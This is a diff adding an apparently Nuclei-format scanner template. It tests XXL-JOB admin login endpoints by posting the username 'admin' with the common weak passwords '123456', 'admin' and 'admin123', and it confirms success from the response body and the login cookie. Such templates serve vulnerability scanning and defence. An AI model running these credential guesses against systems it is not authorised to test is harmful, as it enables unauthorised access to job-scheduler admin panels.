@@ -1,0 +1,32 @@
+id: poc-xxl-job-weak-pass
+info:
+  name: XXL-JOB Weak Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: weak-password,login
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/xxl-job-admin/login"
+      - "{{BaseURL}}/login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "userName=admin&password={{password}}"
+    payloads:
+      password:
+        - "123456"
+        - "admin"
+        - "admin123"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"code":200,"msg":null,"content":null}'
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie: XXL_JOB_LOGIN_IDENTITY"
